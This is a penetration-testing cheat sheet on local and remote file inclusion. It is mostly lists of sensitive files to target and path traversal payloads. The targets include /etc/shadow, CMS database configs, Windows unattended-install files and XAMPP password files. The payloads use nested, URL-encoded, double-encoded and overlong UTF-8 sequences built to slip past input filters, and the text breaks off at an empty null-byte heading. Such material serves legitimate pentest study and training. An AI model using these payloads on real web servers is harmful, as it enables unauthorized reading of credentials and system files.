# Local and remote file inclusion
Local file inclusion (LFI) vulnerabilities allow an attacker to read local files on the web server using malicious web requesrts. These files can include web configuration files, log files, password files and other sensitive system data. LFI can also be used for remote code execution (RCE). In most cases, this vulnerability is due to poor input sanitization.

Remote file inclusions is similar, but the attacker is taking advantage of the web server's ability to call local files, and using it to upload files from remote servers. These remote files can be malicious code that executes in the context of the web server user (e.g. www-data).

## Interesting files
If an LFI vulnerability exists, look for these files:

### Linux
Linux system files:
```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
```
**Log files**
Potentially interesting logfiles:
```
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
```
**CMS configuration files**
Content management system configuration files:
```
WordPress: /var/www/html/wp-config.php
Joomla: /var/www/configuration.php
Dolphin CMS: /var/www/html/inc/header.inc.php
Drupal: /var/www/html/sites/default/settings.php
Mambo: /var/www/configuration.php
PHPNuke: /var/www/config.php
PHPbb: /var/www/config.php
```
### Windows
Files that may exist on Windows systems:
```
C:/windows/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
```
**XAMPP**
Interesting XAMPP files on Windows:
```
C:/xampp/apache/conf/httpd.conf
C:/xampp/security/webdav.htpasswd
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
```
## Techniques

### Basic
Assuming you are on a Linux system, test if you can display `/etc/passwd` by moving back 5 directory levels:
```
http://host/?page=../../../../../etc/passwd
```
Even if this doesn't work, it doesn't mean that the website is immune to path traversal. When filtering input, developers will often prevent the use of forward slashes, but not backslashes or encoded characters.

### Nesting traversal sequences
If the application is attempting to sanitize user input by removing traversal sequences, but does not apply this filter recursively, then it may be possible to bypass the filter by placing one sequence within another:

```
....//

....\/

..../\

....\\
```

### URL-encoded
Encoding all the slashes and dots in your path traversal could bypass input filters:
 
```
dot             %2e
forward slash   %2f
backslash       %5c
```
Example: 
```
 %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
```

### Double URL-encoded
Another encoding method:
```
dot             %252e
forward slash   %252f
backslash       %255c
```
Example:
```
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```
### Overlong UTF-8 encoding
You can also use the illegal Unicode payload type in Burp Intruder for this technique:

```
dot             %c0%2e  %e0%40%ae  %c0ae etc.
forward slash   %c0%af  %e0%80%af  %c0%2f etc.
backslash       %c0%5c  %c0%80%5c  etc.
```

### Null-byte injection
